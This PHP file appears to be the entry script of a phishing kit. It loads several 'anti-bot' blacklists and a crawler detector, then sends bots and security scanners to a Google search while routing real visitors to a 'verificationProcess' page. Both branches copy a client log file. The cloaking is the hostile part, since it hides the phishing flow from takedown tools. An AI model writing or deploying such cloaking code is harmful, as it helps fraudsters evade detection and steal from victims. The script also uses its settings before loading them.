<?php

# Debug

if($settings['debug'] == "1"){
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
};

# Settings

$settings = include('../settings/settings.php');

# User Agent

$useragent = $_SERVER['HTTP_USER_AGENT'];

# Anti Bots 

include("Bots/fucker.php");
include("Bots/Anti/out/blacklist.php");
include("Bots/Anti/out/bot-crawler.php");
include("Bots/Anti/out/anti.php");
include("Bots/Anti/out/ref.php");
include("Bots/Anti/out/bots.php");
include("Bots/Anti/out/Crawler/src/CrawlerDetect.php");

# Check User-Agents

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($settings['print_match'] == "1"){
	echo $CrawlerDetect->getMatches();
}

if($CrawlerDetect->isCrawler($useragent)){
	copy("../Logs/client.txt", "client.txt");
	header('Referer: '.$settings['referer']);
	header('Location: https://google.com/search?q='.$settings['out']);

} else {
	copy("../Logs/client.txt", "client.txt");
	header("Location: verificationProcess/back.php");
}
?>
